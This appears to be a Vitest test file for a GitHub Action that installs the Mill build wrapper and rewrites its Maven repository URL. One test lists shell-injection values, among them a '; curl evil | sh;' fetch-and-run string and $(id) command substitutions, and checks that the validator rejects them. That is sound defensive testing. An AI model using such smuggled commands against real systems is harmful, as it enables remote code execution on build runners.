import {execFileSync} from 'node:child_process'
import {
  existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync,
} from 'node:fs'
import {readFile, writeFile} from 'node:fs/promises'
import * as os from 'node:os'
import {join} from 'node:path'
import process from 'node:process'
import * as core from '@actions/core'
import * as exec from '@actions/exec'
import * as io from '@actions/io'
import * as tc from '@actions/tool-cache'
import {
  beforeEach, expect, test, vi,
} from 'vitest'
import {
  getBundledMillPath, install, remove, withMavenRepository,
} from './mill.js'

vi.mock('node:fs/promises', () => ({
  readFile: vi.fn(),
  writeFile: vi.fn(),
}))
vi.mock('node:os', async importOriginal => ({
  ...await importOriginal<typeof os>(),
  homedir: vi.fn(),
}))
vi.mock('@actions/core')
vi.mock('@actions/exec')
vi.mock('@actions/io')
vi.mock('@actions/tool-cache')

const maven = 'https://repo1.maven.org/maven2'

/** Defaults to a runner with no mill-repository override. */
function setup({millRepository = ''}: {millRepository?: string} = {}) {
  vi.mocked(core.getInput).mockImplementation(name => name === 'mill-repository' ? millRepository : '')
  vi.mocked(os.homedir).mockReturnValue('/home/runner')
}

beforeEach(() => {
  vi.resetAllMocks()
})

test('`getBundledMillPath()` → returns path where mill binary exists', () => {
  const millPath = getBundledMillPath()
  expect(existsSync(millPath)).toBe(true)
})

test('`withMavenRepository()` → replaces the Maven Central URL in the embedded wrapper', () => {
  const wrapper = readFileSync(getBundledMillPath(), 'utf8')

  const rewritten = withMavenRepository(wrapper, 'https://nexus.example.com/maven-public')

  expect(wrapper).toContain(maven)
  expect(rewritten).not.toContain(maven)
  expect(rewritten).toContain('https://nexus.example.com/maven-public/com/lihaoyi/mill-dist')
})

test('`withMavenRepository()` → strips trailing slashes off the repository', () => {
  const rewritten = withMavenRepository(`URL="${maven}/com/lihaoyi/mill-dist"`, 'https://mirror.example.com/maven///')

  expect(rewritten).toBe('URL="https://mirror.example.com/maven/com/lihaoyi/mill-dist"')
})

test('`withMavenRepository()` → rejects repositories with shell metacharacters', () => {
  const attempts = [
    'https://mirror.example.com/"; curl evil | sh; "',
    'https://mirror.example.com/$(id)',
    'https://mirror.example.com/`id`',
    'https://mirror.example.com/\'',
    'https://mirror.example.com/a b',
    'https://mirror.example.com/a\nb',
    'ftp://mirror.example.com/maven',
    'not a url',
  ]

  for (const repository of attempts) {
    expect(() => withMavenRepository('wrapper', repository)).toThrow(/Invalid mill-repository URL/v)
  }
})

test('`install()` → fails on a mill-repository that is not a plain URL', async () => {
  setup({millRepository: 'https://mirror.example.com/$(id)'})
  vi.mocked(readFile).mockResolvedValue(`URL="${maven}/com/lihaoyi/mill-dist"`)

  await expect(install()).rejects.toThrow(new Error('Unable to install Mill wrapper'))
  expect(vi.mocked(writeFile)).not.toHaveBeenCalled()
})

test('`withMavenRepository()` → keeps the wrapper unchanged for Maven Central', () => {
  const wrapper = readFileSync(getBundledMillPath(), 'utf8')

  expect(withMavenRepository(wrapper, maven)).toBe(wrapper)
})

test('`install()` → copies the bundled wrapper into the binary directory', async () => {
  setup()

  await install()

  expect(vi.mocked(io.mkdirP).mock.calls[0]?.[0]).toBe('/home/runner/bin')
  expect(vi.mocked(io.cp).mock.calls[0]).toStrictEqual([getBundledMillPath(), '/home/runner/bin/mill'])
  expect(vi.mocked(tc.downloadTool)).not.toHaveBeenCalled()
})

test('`install()` → downloads the wrapper from `mill-wrapper-url` and ignores `mill-repository`', async () => {
  setup({millRepository: 'https://mirror.example.com/maven'})

  await install('https://example.com/mill')

  expect(vi.mocked(tc.downloadTool).mock.calls[0]).toStrictEqual(['https://example.com/mill', '/home/runner/bin/mill'])
  expect(vi.mocked(io.cp)).not.toHaveBeenCalled()
  expect(vi.mocked(readFile)).not.toHaveBeenCalled()
  expect(vi.mocked(writeFile)).not.toHaveBeenCalled()
})

test('`install()` → rewrites the wrapper when `mill-repository` is a mirror', async () => {
  setup({millRepository: 'https://mirror.example.com/maven'})
  vi.mocked(readFile).mockResolvedValue(`URL="${maven}/com/lihaoyi/mill-dist"`)

  await install()

  expect(vi.mocked(writeFile).mock.calls[0]).toStrictEqual([
    '/home/runner/bin/mill', 'URL="https://mirror.example.com/maven/com/lihaoyi/mill-dist"',
  ])
})

test('`install()` → skips the rewrite when `mill-repository` is Maven Central', async () => {
  setup({millRepository: maven})
  vi.mocked(readFile).mockResolvedValue(`URL="${maven}/com/lihaoyi/mill-dist"`)

  await install()

  expect(vi.mocked(writeFile)).not.toHaveBeenCalled()
})

test('`install()` → makes the wrapper executable and adds it to the PATH', async () => {
  setup()

  await install()

  expect(vi.mocked(exec.exec).mock.calls[0]?.[0]).toBe('chmod')
  expect(vi.mocked(exec.exec).mock.calls[0]?.[1]).toStrictEqual(['+x', '/home/runner/bin/mill'])
  expect(vi.mocked(core.addPath).mock.calls[0]?.[0]).toBe('/home/runner/bin')
})

test('`install()` → keeps the original failure as the cause', async () => {
  setup()

  const cause = new Error('disk full')
  vi.mocked(io.cp).mockRejectedValue(cause)

  await expect(install()).rejects.toThrow(new Error('Unable to install Mill wrapper'))
  await expect(install()).rejects.toHaveProperty('cause', cause)
})

test('`install()` → survives a rejection that is not an Error', async () => {
  setup()
  vi.mocked(io.cp).mockRejectedValue('copy exploded')

  await expect(install()).rejects.toThrow(new Error('Unable to install Mill wrapper'))
  expect(vi.mocked(core.error)).toHaveBeenCalledWith('copy exploded')
})

test('`remove()` → deletes the Mill wrapper from the binary directory', async () => {
  vi.mocked(os.homedir).mockReturnValue('/home/runner')

  await remove()

  expect(vi.mocked(io.rmRF).mock.calls[0]?.[0]).toBe('/home/runner/bin/mill')
})

/**
 * Runs a wrapper script in dry-run mode inside `dir` and returns the
 * download URL it resolved. The wrapper exits before downloading and
 * prints the URL and the target path instead.
 */
function dryRun(script: string, dir: string, env: Record<string, string>): string {
  const output = execFileSync('sh', [script], {
    cwd: dir,
    env: {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      HOME: dir,
      MILL_TEST_DRY_RUN_LAUNCHER_SCRIPT: '1',
      MILL_FINAL_DOWNLOAD_FOLDER: dir,
      MILL_OUTPUT_DIR: dir,
      ...env,
    },
    encoding: 'utf8',
  })

  return output.trim().split('\n')[0] ?? ''
}

/** Uses 0.12.5 since its URL does not depend on the platform the test runs on. */
test('embedded wrapper dry run → resolves a version to its Maven Central URL', () => {
  const dir = mkdtempSync(join(os.tmpdir(), 'mill-wrapper-'))

  try {
    const url = dryRun(getBundledMillPath(), dir, {MILL_VERSION: '0.12.5'})

    expect(url).toBe(`${maven}/com/lihaoyi/mill-dist/0.12.5/mill-dist-0.12.5.jar`)
  } finally {
    rmSync(dir, {recursive: true, force: true})
  }
})

test('embedded wrapper dry run → detects the version from `.mill-version`', () => {
  const dir = mkdtempSync(join(os.tmpdir(), 'mill-wrapper-'))

  try {
    writeFileSync(join(dir, '.mill-version'), '0.12.5\n')

    const url = dryRun(getBundledMillPath(), dir, {})

    expect(url).toBe(`${maven}/com/lihaoyi/mill-dist/0.12.5/mill-dist-0.12.5.jar`)
  } finally {
    rmSync(dir, {recursive: true, force: true})
  }
})

test('embedded wrapper dry run → downloads from the mirror after the rewrite', () => {
  const dir = mkdtempSync(join(os.tmpdir(), 'mill-wrapper-'))

  try {
    const rewritten = withMavenRepository(readFileSync(getBundledMillPath(), 'utf8'), 'https://mirror.example.com/maven')
    const script = join(dir, 'mill')
    writeFileSync(script, rewritten)

    const url = dryRun(script, dir, {MILL_VERSION: '0.12.5'})

    expect(url).toBe('https://mirror.example.com/maven/com/lihaoyi/mill-dist/0.12.5/mill-dist-0.12.5.jar')
  } finally {
    rmSync(dir, {recursive: true, force: true})
  }
})
